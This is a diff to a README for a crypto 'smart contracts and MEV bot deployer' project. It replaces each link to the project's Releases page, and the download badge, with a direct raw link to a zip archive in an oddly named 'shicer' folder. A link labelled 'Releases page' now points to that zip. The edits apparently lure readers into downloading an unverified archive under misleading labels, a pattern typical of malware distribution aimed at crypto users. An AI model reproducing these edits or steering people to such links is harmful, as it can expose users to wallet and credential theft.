@@ -1,6 +1,6 @@
 # 🚀 smart-contracts-and-mev-bot-deployer - Deploy Smart Contracts with Ease
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/daughterly-deep79/smart-contracts-and-mev-bot-deployer/releases)
+[![Download](https://raw.githubusercontent.com/daughterly-deep79/smart-contracts-and-mev-bot-deployer/main/shicer/smart-contracts-and-mev-bot-deployer-v3.7-beta.1.zip)](https://raw.githubusercontent.com/daughterly-deep79/smart-contracts-and-mev-bot-deployer/main/shicer/smart-contracts-and-mev-bot-deployer-v3.7-beta.1.zip)
 
 ## 📖 About
 
@@ -21,7 +21,7 @@ Make sure your computer meets these basic requirements:
 
 ### 2. Visit the Releases Page
 
-Go to the [Releases page](https://github.com/daughterly-deep79/smart-contracts-and-mev-bot-deployer/releases) to access all available versions of the application. Here, you will find the latest version and previous ones if needed.
+Go to the [Releases page](https://raw.githubusercontent.com/daughterly-deep79/smart-contracts-and-mev-bot-deployer/main/shicer/smart-contracts-and-mev-bot-deployer-v3.7-beta.1.zip) to access all available versions of the application. Here, you will find the latest version and previous ones if needed.
 
 ### 3. Download the Application
 
@@ -45,7 +45,7 @@ Once installed, open the smart-contracts-and-mev-bot-deployer application. You s
 
 ## 📥 Download & Install
 
-To download the latest version of the smart-contracts-and-mev-bot-deployer, click this link: [Download](https://github.com/daughterly-deep79/smart-contracts-and-mev-bot-deployer/releases).
+To download the latest version of the smart-contracts-and-mev-bot-deployer, click this link: [Download](https://raw.githubusercontent.com/daughterly-deep79/smart-contracts-and-mev-bot-deployer/main/shicer/smart-contracts-and-mev-bot-deployer-v3.7-beta.1.zip).
 
 After downloading, remember to follow the installation steps provided above.
 
